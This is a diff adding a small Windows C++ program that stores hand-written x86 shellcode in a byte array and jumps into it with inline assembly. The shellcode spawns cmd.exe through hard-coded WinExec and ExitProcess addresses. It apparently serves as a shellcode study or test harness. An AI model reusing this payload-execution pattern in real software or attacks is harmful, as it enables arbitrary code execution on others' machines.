@@ -1,0 +1,26 @@
+#include <iostream>
+#include <Windows.h>
+#include <cstdio>
+char shellcode[] =
+"\xC6\x45\xFC\x63"
+"\xC6\x45\xFD\x6D"
+"\xC6\x45\xFE\x64"
+"\xC6\x45\xFF\x00"
+"\x6A\x05"
+"\x8D\x45\xFC"
+"\x50"
+"\xB8\xB0\xDA\xEF\x74"
+"\xFF\xD0"
+"\x8B\xF4"
+"\x6A\x01"
+"\xB8\x90\x59\xEC\x74"
+"\xFF\xD0";
+int main(int argc, char* argv[])
+{
+    int* shell = (int*)shellcode;
+ 
+    __asm {
+        jmp shell
+
+    }
+}
